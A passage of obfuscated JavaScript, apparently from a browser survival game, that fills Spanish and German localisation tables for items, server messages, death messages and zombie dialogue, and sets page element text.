			ΔⵠΔ[ᐃᐃ.ⲆⲆΔᐃΔ] = ["Lanza de Amatista", "Los dragones te tienen miedo", "Daño: 18", "Daño para estructuras: 6"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⵠΔᐃ] = ["Pala de Piedra", ⵠ[173], ⵠ[206], ⵠ[58]];
			ΔⵠΔ[ᐃᐃ.ΔΔⲆⵠΔ] = ["Pala de Oro", ⵠ[173], ⵠ[206], "Daño: 3", ⵠ[417]];
			ΔⵠΔ[ᐃᐃ.ⵠᐃΔΔᐃ] = ["Pala de Diamante", ⵠ[173], ⵠ[206], "Daño: 4", ⵠ[417]];
			ΔⵠΔ[ᐃᐃ.ⵠᐃᐃⲆΔ] = ["Pala de Amatista", ⵠ[173], ⵠ[206], "Daño: 5", ⵠ[417]];
			ΔⵠΔ[ᐃᐃ.ᐃⵠⵠⲆΔ] = ["Casco de Madera", "¡Mejor que nada!", "Protección contra jugadores: 1", "Protección contra animales: 4"];
			ΔⵠΔ[ᐃᐃ.ⵠΔΔᐃⲆ] = ["Casco de Piedra", "¡Estas listo para la batalla!", "Protección contra jugadores: 2", "Protección contra animales: 8"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⲆⵠΔ] = ["Casco de Oro", "AKA el casco de los salvajes", "Protección contra jugadores: 4", "Protección contra animales: 13"];
			ΔⵠΔ[ᐃᐃ.ᐃΔⲆⲆⲆ] = ["Casco de Diamante", "No ataques tanto", "Protección de jugadores: 5", "Protección contra animales: 19"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔⲆΔ] = ["Casco de Amatista", "¡No tienes miedo de nada!", "Protección contra jugadores: 6", "Protección contra animales: 23"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆⲆⵠ] = ["Casco del Dragón", "¡Vas a dominar el mundo!", "Protección contra jugadores: 8", "Protección contra animales: 27"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆⵠΔ] = ["Gorro del Explorador", "Los animales no te atacarán", "¡Pero no ataques!", " Te calienta en el invierno y fuera del agua"];
			ΔⵠΔ[ᐃᐃ.ΔⵠᐃⲆⲆ] = ["Gorro de Navidad", "¡Ho, ho, ho, feliz Navidad!", "Te calienta en el invierno y fuera del  agua"];
			ΔⵠΔ[ᐃᐃ.ΔⲆΔⵠⵠ] = ["Gorro del Duende", "¡No dejes que te descubren que eres, duende del hielo!", "Te calienta en el invierno y fuera del agua"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠᐃΔΔ] = ["Capucha", "¡Eres un ladron!", "Puedes robar de alguien solo si", "1) Es de noche", "2) No tienes nada en tu mano", "3) Si no te han tocado en los  8 segundos anteriores", "4) No estas cerca de una fogata", "5) Si tu objetivo no lleva puesto una gorra de campesino", ⵠ[508]];
			ΔⵠΔ[ᐃᐃ.ΔⵠᐃⲆⵠ] = ["Orejeras", "Como un abrigo pequeño.", ⵠ[508]];
			ΔⵠΔ[ᐃᐃ.ᐃᐃⲆⵠᐃ] = [ⵠ[308], "También llamado abrigo.", "Te calienta en el invierno y fuera del agua"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔᐃⲆ] = ["Gorro y Bufanda ", "Muy cómodo, muy caliente"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆΔⲆᐃ] = ["Gorra de Campesino", "Tus plantas crecen mas rápido", "Te Calienta en el invierno y fuera del agua"];
			ΔⵠΔ[ᐃᐃ.ΔᐃᐃΔᐃ] = ["Capucha de Invierno", "Puedes robar de alguien solo si", "1) Es de noche", "2) No tienes nada en tu mano", "3) Si no te han tocado antes de 8 segundos", "4) No estas cerca de un fuego", "5) Si tu objetivo no lleva puesto una Gorra de Campesino", ⵠ[508]];
			ΔⵠΔ[ᐃᐃ.ᐃΔⲆᐃⲆ] = ["Gorra de Invierno del Campesino", "Tus plantas crecen aún más rápido", ⵠ[508]];
			ΔⵠΔ[ᐃᐃ.ᐃⲆΔΔⵠ] = ["Máscara de Buceo", "Eres un tiburón en el agua", "Calienta en el agua", "Protección contra jugadores: 2, Protección contra animales: 8"];
			ΔⵠΔ[ᐃᐃ.ΔⵠᐃΔⲆ] = ["Súper Máscara de Buceo", "Eres muy rápido en agua", "Calienta en el agua", "Defensa del Jugador: 4, Defensa de los animales: 16"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⵠΔⵠ] = ["Esfera del Dragón", "Dada en la misión"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⲆⲆᐃ] = ["Corazón del Dragón", "¡Te convierte en un fantasma cuando mueres!", "Eres un fantasma por 60 segundos", "Encuentra una Piedra de resurreción"];
			ΔⵠΔ[ᐃᐃ.ΔⲆⵠᐃⵠ] = ["Gema Verde", "¿¿No has hecho trampas, verdad??"];
			ΔⵠΔ[ᐃᐃ.ΔᐃⲆᐃᐃ] = ["Gema Naranja", "¡Solo un pirata verdadero lo puede encontrar!"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃΔⵠΔ] = ["Gema Azul", "Para gente muy amable"];
			ΔⵠΔ[ᐃᐃ.Ⲇⵠᐃⵠⵠ] = ["Corona Verde", "Te sanas muy rápido", "Sanación con el tiempo: 40", "Protección contra jugadores: 4, Protección contra animales: 16"];
			ΔⵠΔ[ᐃᐃ.ᐃΔⵠⲆⲆ] = ["Corona Naranja", "Ahora tienes much suerte", "Protección contra jugadores: 4, Protección contra animales: 16"];
			ΔⵠΔ[ᐃᐃ.ΔᐃᐃΔΔ] = ["Corona Azul", "Cuando mueres, te conviertes en un fantasma", "Pero perderás tu alma", "Protección contra jugador: 4, Protección contra animales: 16"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⵠⵠΔ] = ["Cubo", "Bueno para rellenar botellas", "Un cubo es equivalente a 12 botellas"];
			ΔⵠΔ[ᐃᐃ.Δⵠⵠⵠⵠ] = ["Cubo Vacío", "Tienes que llenar este cubo con agua"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆᐃᐃᐃ] = ["Botella", "Te permite beber agua donde quieras", "Agua: 50"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃⲆⲆᐃ] = ["Botella Vacia", "La puedes llenar de agua"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆᐃⵠ] = ["Regadera Vacía", "La tienes que llenar de agua"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆⵠⵠ] = ["Regadera", "Te permite regar las plantas", "Daño: 1"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃᐃⵠ] = ["Mochila", "¡Mas espacio para tus cosas!"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⵠΔⲆ] = ["Hoja", "Usada para hacer un libro"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⲆⵠⲆ] = ["Libro", "Reduce el tiempo de elaboración", "Lo tienes que tener en la mano para que funcione", "Daño: 1"];
			ΔⵠΔ[ᐃᐃ.ΔΔⵠⵠᐃ] = ["Vendaje", "Recuperas vida mas rapido", "Sanación tiempo: 30", "Efecto: 5"];
			ΔⵠΔ[ᐃᐃ.ΔΔΔⵠᐃ] = ["Cerradura", "Te permite cerrar tu cofre"];
			ΔⵠΔ[ᐃᐃ.ΔⵠΔⵠΔ] = ["Llave", "Te permite abrir un cofre cerrado"];
			ΔⵠΔ[ᐃᐃ.ⲆΔᐃⲆᐃ] = ["Tótem", "Te permite crear un equipo", "Compartir puertas y cofres cerrados", "Tus pinchos no dañan al resto tu equipo"];
			ΔⵠΔ[ᐃᐃ.ΔⲆΔⲆᐃ] = ["Puente", "Muy útil en el agua", "Te permite beber agua sin tener que ahogarse", "Puedes nadar más rápido encima del agua"];
			ΔⵠΔ[ᐃᐃ.ᐃⵠᐃⲆᐃ] = ["Cartel", "Sirve para dejar un mensage para otros", "Durabilidad: 200"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⲆᐃⵠ] = ["Techo", "Te esconde un poco y te protege del frío"];
			ΔⵠΔ[ᐃᐃ.ΔⲆᐃΔⵠ] = ["Fuente", "Permite rellenar botellas", ⵠ[502]];
			ΔⵠΔ[ᐃᐃ.ⲆΔΔⵠᐃ] = ["Pared de Madera", "Es solo una pared.", ⵠ[502]];
			ΔⵠΔ[ᐃᐃ.ΔⵠΔⲆⲆ] = ["Pared de Piedra", "Es un poco más serio", "Durabilidad: 1500"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃᐃΔⲆ] = ["Pared de Oro", "¿Oro en de tus paredes? Eres rico", ⵠ[356]];
			ΔⵠΔ[ᐃᐃ.ⲆΔⲆᐃᐃ] = ["Pared de Diamante", "Muy brillante, cuidado con tus ojos", "Durabilidad: 2500"];
			ΔⵠΔ[ᐃᐃ.ᐃΔᐃΔⵠ] = ["Pared de Amatista", "¡Debes tener mucho miedo de lo que hay fuera!", "Durabilidad: 3500"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⵠΔⲆ] = ["Pincho de Madera", "Puede dañar a tus enemigos", "Daño: 10, Daño por golpe: 2", "Durabilidad: 150"];
			ΔⵠΔ[ᐃᐃ.ⲆΔᐃΔᐃ] = ["Pincho de Piedra", "No querría ser tu enemigo.", "Daño: 20", "Daño por contacto: 3", "Durabilidad: 300"];
			ΔⵠΔ[ᐃᐃ.ⲆΔⲆⵠΔ] = ["Pincho de Oro", "¡Eres tan cruel!", "Daño: 30", "Daño por golpe: 3", "Durabilidad: 600"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆΔⵠⲆ] = ["Pincho de Diamante", "No te gusta tener compañía.", "Daño: 40", "Daño por contacto: 4", "Durabilidad: 1200"];
			ΔⵠΔ[ᐃᐃ.ΔⲆⵠⵠᐃ] = ["Pincho de Amatista", "¡¿Que demonios te hicieron tus vecinos?!", "Daño: 50", "Daño por contacto: 4", "Durabilidad: 2400"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃᐃⵠᐃ] = ["Puerta de Madera", "Puedes abrir y cerrarla ", ⵠ[502]];
			ΔⵠΔ[ᐃᐃ.ⲆΔⵠΔΔ] = ["Puerta de Piedra", "Una puerta más buena es más seria", "Durabilidad: 1500"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⵠⵠᐃ] = ["Puerta de Oro", "¿Estas reconstruyendo El Dorado?", ⵠ[356]];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⵠᐃⲆ] = ["Puerta de Diamante", "Para una casa brillante", "Durabilidad: 2500"];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⲆⲆⲆ] = ["Puerta de Amatista", "¿Tu casa es una caja fuerte?", "Durabilidad: 3500"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⵠΔᐃ] = ["Caldera", "Te calienta", "Consume 1 Madera cada 5 segundos", ⵠ[502]];
			ΔⵠΔ[ᐃᐃ.ΔΔⲆᐃᐃ] = ["Molino", "Puede producir harina a partir del trigo", "Necesita 5 segundos para producir harina", "Devuelve los puntos que trabaja", ⵠ[356]];
			ΔⵠΔ[ᐃᐃ.ⲆⵠᐃⲆⵠ] = ["Horno de Pan", "Produce pan de harina", "Necesita 10 segundos para producir Pan", "Devuelve los puntos que trabaja", ⵠ[356]];
			ΔⵠΔ[ᐃᐃ.ⵠⵠᐃⲆⵠ] = ["Piedra de Resurreción", "¡Es magia!", "Te resucitacuando eres una fantasma", "Perderás tu arma", "Durabilidad: 200"];
			ΔⵠΔ[ⲆⲆΔ.ᐃⵠⲆΔⲆⲆⲆ] = "No puedes unirte a este servidor";
			ΔⵠΔ[ⲆⲆΔ.ⲆⲆᐃⲆΔΔᐃ] = "Expulsado: ";
			ΔⵠΔ[ⲆⲆΔ.ΔᐃⵠⵠΔⲆⲆ] = "Tu llave ya está usada";
			ΔⵠΔ[ⲆⲆΔ.ᐃᐃⵠⵠΔᐃⵠ] = "Tu llave está mal";
			ΔⵠΔ[ⲆⲆΔ.ⵠΔΔⲆΔᐃⵠ] = "Tienes una versión antigua, limpia tu cache";
			ΔⵠΔ[ⲆⲆΔ.ᐃΔΔΔⵠⵠᐃ] = "No hay mas recursos";
			ΔⵠΔ[ⲆⲆΔ.ᐃⲆᐃⲆⵠⲆᐃ] = "Has sobrevivido 1 día";
			ΔⵠΔ[ⲆⲆΔ.ΔⵠⲆΔⵠᐃΔ] = "Has sobrevivido ";
			ΔⵠΔ[ⲆⲆΔ.ⲆⲆΔΔⲆᐃᐃ] = " días";
			ΔⵠΔ[ⲆⲆΔ.ᐃΔᐃⲆᐃⵠⵠ] = "Estás muerto ;-;";
			ΔⵠΔ[ⲆⲆΔ.ΔΔⵠⵠⲆⲆᐃ] = "No se encuentra un lugar para unirse, ¡spamea el botón de jugar!";
			ΔⵠΔ[ⲆⲆΔ.ⵠᐃⵠⲆⵠΔΔ] = "El servidor esta lleno, ¡spamea el botón de jugar!";
			ΔⵠΔ[ⲆⲆΔ.EMPTY] = "Recurso vacio";
			ΔⵠΔ[ⲆⲆΔ.ΔᐃⲆᐃⲆⲆⲆ] = "¡Inventario lleno!(Haz click derecho para borrar cosas) ";
			ΔⵠΔ[ⲆⲆΔ.ΔᐃΔⲆᐃⲆⲆ] = " está muerto";
			ΔⵠΔ[ⲆⲆΔ.ⲆⲆⲆⲆᐃᐃᐃ] = "Esta no es la herramienta correcta";
			ΔⵠΔ[ⲆⲆΔ.ΔⵠⵠⲆΔⵠᐃ] = "Te has unido a un equipo";
			ΔⵠΔ[ⲆⲆΔ.ⲆⵠΔⵠᐃᐃΔ] = "Estás muerto";
			ΔⵠΔ[ⲆⲆΔ.ⵠⲆΔᐃⲆⵠΔ] = " se unió al equipo";
			ΔⵠΔ[ⲆⲆΔ.ᐃᐃⲆᐃᐃΔⲆ] = "Tu equipo ha sido destruido";
			ΔⵠΔ[ⲆⲆΔ.ΔΔᐃᐃⵠⵠΔ] = "Has dejado el equipo";
			ΔⵠΔ[ⲆⲆΔ.ⵠⵠⵠⵠⵠⵠᐃ] = " dejo el equipo ";
			ΔⵠΔ[ⲆⲆΔ.ᐃⵠᐃΔⲆ] = "Alguien te robó tu token :>";
			ΔⵠΔ[ⲆⲆΔ.ᐃⵠᐃⲆⲆⵠⲆ] = "Elige un servidor";
			ΔⵠΔ[ⲆⲆΔ.ⵠⲆⵠⵠⲆ] = "jugadores";
			ΔⵠΔ[ⲆⲆΔ.ⲆⲆⲆᐃⵠⲆⲆ] = "total de jugadores";
			ΔⵠΔ[ⲆⲆΔ.ⲆⵠΔⵠᐃΔᐃ] = "Jugadores en este modo de juego";
			ΔⵠΔ[ⲆⲆΔ.ⵠⲆⵠⲆⲆᐃᐃ] = "Próximamente...";
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[505]).placeholder = "Apodo";
			ᐃᐃΔᐃ[0] = ["Has muerto por ninguna razón"];
			ᐃᐃΔᐃ[ⵠΔΔ] = ["Has muerto de hambre, como implica el nombre del juego dice"];
			ᐃᐃΔᐃ[2] = ["Te has congelado hasta morir, qué triste", "Moriste por hipotermia. La próxima quédate cerca de  una fogata."];
			ᐃᐃΔᐃ[3] = ["Un jugador te ha matado diciendo que mejores.", "Fuiste asesinado por un jugador, pero no te preocupes, ese jugador también morirá, eventualmente."];
			ᐃᐃΔᐃ[4] = ["Te has acercado demasiado al fuego, y te has quemado vivo, mala idea.", "Has muerto por el fuego, el fuego te quema, ve y escribe una historia sobre eso."];
			ᐃᐃΔᐃ[ⲆⲆΔⵠ] = ["Tu cuerpo será un buen nido para los huevos de la arañas", "Una araña te ha matado, al menos no fué un conejo."];
			ᐃᐃΔᐃ[ᐃⵠⵠⲆⵠ] = ["El lobo no tendrá hambre después de comerte.", "No son perros, no les gusta ser acariciados."];
			ᐃᐃΔᐃ[7] = ["El zorro era demasiado rápido para ti.", "El zorro te convirtió en una caja. ¿Desde cuándo los animales tienen poderes mágicos?"];
			ᐃᐃΔᐃ[ΔᐃᐃⲆᐃ] = ["El oso solo quería un abrazo", "El oso era demasiado para ti. Lo siento."];
			ᐃᐃΔᐃ[ⲆΔⲆΔⵠ] = ["El dragón te quemó vivo.", "El dragón te ha aplastado, todos tus huesos ahora son vapor... otro cadaver mas."];
			ᐃᐃΔᐃ[10] = ["Has saltado a una pared de pinchos, mala idea", "Has muerto por una pared de pinchos. La gente suele ser lo suficientemente sensible para no tocar cosas puntiagudas.."];
			ᐃᐃΔᐃ[11] = ["Un fantasma también puede morir.", "No has revivido a tiempo, asi que eres un fantasma de un fantasma."];
			ᐃᐃΔᐃ[ΔΔΔᐃᐃⲆᐃ] = ["Una bacteria te ha matado por comer carne cruda. Este juego es muy difícil.", "Has matado a la carne cruda. Ella también te ha matado a ti.."];
			ᐃᐃΔᐃ[ⵠᐃᐃΔⲆ] = ["Has muerto de sed, mejor bebe tu propia orina."];
			ᐃᐃΔᐃ[14] = ["¿Sabiás que los jugadores tienen su boca debajo del agua? Ahora lo sabes."];
			ᐃᐃΔᐃ[ⵠᐃⵠΔⲆⵠⵠ] = ["No te preocupes, a la piraña le pareciste delicioso.", "Las pirañas comen a personas, incluyendote a ti también."];
			ᐃᐃΔᐃ[16] = ["LapaMauve no planea que puedas matar al kraken", "Un Kraken te partió el kra-neo."];
			ᐃᐃΔᐃ[17] = ["Tu piel se cayó, el sol te quemó."];
			ᐃᐃΔᐃ[ᐃᐃΔᐃⲆⵠᐃ] = ["El ajo guardado en tu bolsillo te quemó el cerebro."];
			ᐃᐃΔᐃ[19] = ["Eres un vampiro, no te quedes cerca del ajo."];
			ᐃᐃΔᐃ[Δⵠᐃᐃᐃ] = ["Has comido un ajo siendo  vampiro,¿que esperabas?"];
			ᐃᐃΔᐃ[21] = ["Te has quedado atrapado en una planta de espinas. Al intentar escapar, tu piel se cae y entra un pincho en tu corazón."];
			ⲆⲆΔΔⲆ = ⵠ[170];
			ΔⵠᐃⲆⲆⵠⲆ = ["Uuunnnggg... Tengo hambre", "Necesito tu cerebro uuunnnggg...", "Carne fresca... Uuunnnggg", "Uuunnnggg... Pareces delicioso", ⵠ[200], "Comida... uuunnnggg...", "Puedo oler sangre... Uuunnnggg"]
		};
		const ΔΔⵠⵠΔ = ⵠᐃΔΔ;
		const ΔⵠΔⵠ = ᐃⲆᐃ;
		var ΔᐃΔⲆᐃΔⵠ = function() {
			ΔⵠΔ[ᐃᐃ.ⲆᐃΔᐃᐃ] = [ⵠ[207]];
			ᐃᐃΔᐃ[22] = [ⵠ[41]];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆΔⵠ] = [ⵠ[169], ⵠ[59], ⵠ[57]];
			ΔⵠΔ[ⲆⲆΔ.ᐃⲆΔᐃᐃⵠᐃ] = ⵠ[251];
			ΔⵠΔ[ⲆⲆΔ.ΔⵠⵠᐃᐃΔⵠ] = ⵠ[335];
			ΔⵠΔ[ⲆⲆΔ.ΔⵠᐃⲆⲆⲆΔ] = ⵠ[462];
			ΔⵠΔ[ⲆⲆΔ.ⲆᐃΔᐃᐃᐃⵠ] = ⵠ[270];
			ΔⵠΔ[ⲆⲆΔ.POINTS] = ⵠ[250];
			ΔⵠΔ[ⲆⲆΔ.ⵠΔΔᐃᐃᐃⵠ] = ⵠ[165];
			ΔⵠΔ[ⲆⲆΔ.ⲆᐃⵠⵠΔΔΔ] = ⵠ[203];
			ΔⵠΔ[ⲆⲆΔ.ⲆᐃᐃⵠⲆⲆᐃ] = ⵠ[368];
			ΔⵠΔ[ⲆⲆΔ.ΔΔⲆΔⲆᐃⲆ] = ⵠ[538];
			ΔⵠΔ[ⲆⲆΔ.ΔⲆⲆΔᐃⲆᐃ] = ⵠ[208];
			ΔⵠΔ[ᐃᐃ.ᐃΔΔΔⵠ] = [ⵠ[188], ⵠ[439], ⵠ[134]];
			ΔⵠΔ[ᐃᐃ.ᐃᐃΔⲆΔ] = [ⵠ[518], ⵠ[ᐃⵠⵠᐃᐃ], ⵠ[449], ⵠ[492]];
			ΔⵠΔ[ᐃᐃ.ΔⲆⲆⲆⲆ] = [ⵠ[287], ⵠ[194], ⵠ[393], ⵠ[489], ⵠ[68], ⵠ[388]];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⲆⲆΔ] = [ⵠ[295], ⵠ[577], ⵠ[527], ⵠ[425], ⵠ[463]];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[219])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[249];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[546])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[286];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[185])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[220];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[136])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[355];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[579])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[485];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[327])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[441];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[322])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[390];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[514])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[296];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[334])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[242];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[233])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[217];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[179])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[230];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[109])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[45];
			for (var ⵠᐃ = 0; ⵠᐃ < 7; ⵠᐃ++) document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[ⵠᐃⲆΔᐃᐃᐃ] + ⵠᐃ)[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[451];
			document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[487])[ΔᐃⲆⵠⲆⵠΔ[290]] = ⵠ[309];
			ΔⵠΔ[ᐃᐃ.ᐃⲆᐃΔᐃ] = ["Hand"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔⲆᐃ] = ["Boden", "Dreckig!"];
			ΔⵠΔ[ᐃᐃ.ΔⲆⲆΔⵠ] = ["Sand", "Ich habe es in meine Augen bekommen!"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆᐃ] = ["Holz", "Du kannst niemals zu viel haben!"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃΔⲆ] = ["Stein", "Auch Fels gennant"];
			ΔⵠΔ[ᐃᐃ.ΔⲆⵠⵠ] = ["Gold", "Sei großzügig, gib anderen etwas ab "];
			ΔⵠΔ[ᐃᐃ.ΔⲆᐃΔ] = ["Diamant", "Was wirst du daraus machen?"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠΔⲆ] = ["Amethyst", "Es ist Mauve farbend, genauso wie Lapa"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃⲆⵠᐃ] = ["Mehl", "wird fürs Backen gebraucht"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆᐃᐃ] = ["Keks", "Ein prächtiger Keks von Großmutter", "Essen: 50"];
			ΔⵠΔ[ᐃᐃ.ⲆΔΔⲆᐃ] = ["Ein Kuchen", "Perfekter Kuchen für Gourmets", ⵠ[238]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆᐃⲆⵠ] = ["rohes Fleisch", "Du kannst es mit einem Feuer braten", "verursacht Lebensmittelvergiftung: 10", "Essen: 15"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⲆⲆⲆ] = ["gebratenes Fleisch", "Einmal blutiges Steak, bitte", "Essen: 35"];
			ΔⵠΔ[ᐃᐃ.ᐃΔΔΔΔ] = ["roher Fisch", "Ich glaube es lebt noch", "verursacht Lebensmittelvergiftung: 10", "Essen: 18"];
			ΔⵠΔ[ᐃᐃ.Ⲇⵠᐃᐃⵠ] = ["gebratener Fisch", "Mit einer Zitrone ist es perfekt", "Essen: 35"];
			ΔⵠΔ[ᐃᐃ.ⲆΔⵠΔⲆ] = ["Brot", "Ein vorzügliches französiches Brot", "Es wird als Währung im Markt benutzt", "Essen: 15"];
			ΔⵠΔ[ᐃᐃ.ΔⵠⲆⵠⵠ] = [ⵠ[239], "Schmeckt wie Krabbenburger", ⵠ[238]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⵠᐃⲆ] = ["Süßigkeiten", "Nur für Kinder!", ⵠ[238]];
			ΔⵠΔ[ᐃᐃ.ΔᐃⲆⵠⲆ] = ["Zuckerstange", "Probier mal, es schmeckt hervorragend", ⵠ[238]];
			ΔⵠΔ[ᐃᐃ.ᐃⲆⲆⲆᐃ] = ["Girlande", "perfekter Schmuck für Dächer"];
			ΔⵠΔ[ᐃᐃ.ⵠΔⵠᐃΔ] = ["Beeren Saatgut", "Wird eine Beere", "Entstehung: 2min", "Wachstum: 55s", "Wasserbedarf: 3min 20s", ⵠ[345], ⵠ[469]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆΔⲆⲆ] = ["Beere", "Beeren lecker!", "Essen: 10"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⲆΔⲆ] = ["Weizen Saatgut", "Wird zu Weizen", "Entstehung: 2min", "Wachstum: 16s", "Wasserbedarf: 2min", ⵠ[345], ⵠ[469]];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆⲆⵠ] = ["Wildes Weizen", "Wenn es in eine Windmühle platziert wird, wird es zu Mehl"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠΔⲆⵠ] = ["Kürbis Saatgut", "Wird zu Kürbis", "Entstehung: 2min 40s", "Wachstum: 2min", "Wasserbedarf: 2min", ⵠ[345], ⵠ[469]];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⵠΔΔ] = ["Kürbis", "Es erinnert mich an Halloween", "Essen: 30"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆⲆⵠⲆ] = ["Knoblauch Saatgut", "Sehr gefährlich für Vampire", "Schaden: 20", "Entstehung: 4min", "Wachstum: 1min 10s", "Wasserbedarf: 1min 40s", ⵠ[345], ⵠ[469]];
			ΔⵠΔ[ᐃᐃ.ⲆΔⵠΔⵠ] = ["Knoblauch", "Heilt dich und hält die Kälte fern", "Essen: 14", "Heilung über Zeit: 30", "Effekt: 1"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠᐃⵠⲆ] = ["Dornenbusch Saatgut", "Kann deinen Gegnern Schaden zufügen", "Schaden: 20", "Entstehung: 4min", "Wachstum: 15s", "Wasserbedarf: 3min", ⵠ[234], ⵠ[469]];
			ΔⵠΔ[ᐃᐃ.ᐃⵠᐃΔΔ] = ["Dornenbusch", "Es sticht!"];
			ΔⵠΔ[ᐃᐃ.ⵠᐃΔⲆⲆ] = ["Topf", "Ernsthaft, benutz es", "Mit diesem GMO dünger deine Pflanzen", "lässt sie schneller wachsen und reduziert den Wasserverbrauch", ⵠ[464]];
			ΔⵠΔ[ᐃᐃ.ᐃⵠⲆⲆΔ] = ["Eis", "Nützlich um Kuchen und Wasser herzustellen"];
			ΔⵠΔ[ᐃᐃ.ΔΔᐃⲆΔ] = ["Schraubenschlüssel", "Es kann Wände, Türen und Stacheln reparieren", ⵠ[519]];
			ΔⵠΔ[ᐃᐃ.ΔᐃᐃᐃΔ] = ["Wolfsfell", "Welpe? Aber wo ist der Welpe?!"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⵠⲆᐃ] = ["Hasenfell", "Der Hase war so süß..."];
			ΔⵠΔ[ᐃᐃ.ΔⲆⵠᐃⲆ] = ["Klares Fell", "Du bist eine Brotfabrik"];
			ΔⵠΔ[ᐃᐃ.ΔⲆΔⵠΔ] = ["Dunkles Fell", "Du machst dich bereit etwas falsches zu vollführen"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆΔⲆⲆ] = ["Winter Fell", "Diese Tiere wollten nur eine Umarmung..."];
			ΔⵠΔ[ᐃᐃ.ⲆⲆⲆᐃᐃ] = ["Schuppen", "Es riecht wie Fisch!"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆᐃⲆᐃ] = ["Kraken Haut", "Warst du nicht zu ängstlich?"];
			ΔⵠΔ[ᐃᐃ.ⵠⲆΔᐃΔ] = ["Lagerfeuer", "Wärmt dich!", "Haltbarkeit: 150", "Lebensdauer: 2min"];
			ΔⵠΔ[ᐃᐃ.ⲆⵠⵠⵠⲆ] = ["Großes Lagerfeuer", "Wärmt dich länger!", "Haltbarkeit: 400", "Lebensdauer: 6min"];
			ΔⵠΔ[ᐃᐃ.ᐃⲆⲆΔᐃ] = ["Werkbank", "Sehr nützlich um allerlei Sachen herzustellen"];
			ΔⵠΔ[ᐃᐃ.ᐃᐃᐃΔΔ] = ["Faden", "Wird benötigt um Mützen und Rucksäcke herzustellen  "];
			ΔⵠΔ[ᐃᐃ.ΔΔΔΔᐃ] = ["Diamant Faden", "Wird für spezielle Mützen gebraucht"];
			ΔⵠΔ[ᐃᐃ.ⵠⵠⵠᐃⵠ] = ["Truhe", "Damit kannst du Gegenstände lagern", "Haltbarkeit: 500"];
			ΔⵠΔ[ᐃᐃ.ΔΔⵠᐃᐃ] = ["Holzschwert", "Funktioniert das?", "Schaden: 12", "Schaden an Gebäuden: 4"];
			ΔⵠΔ[ᐃᐃ.ⲆᐃⵠΔᐃ] = ["Steinschwert", "Sei nett zu Anderen", "Schaden: 19", "Schaden an Gebäuden: 6"];
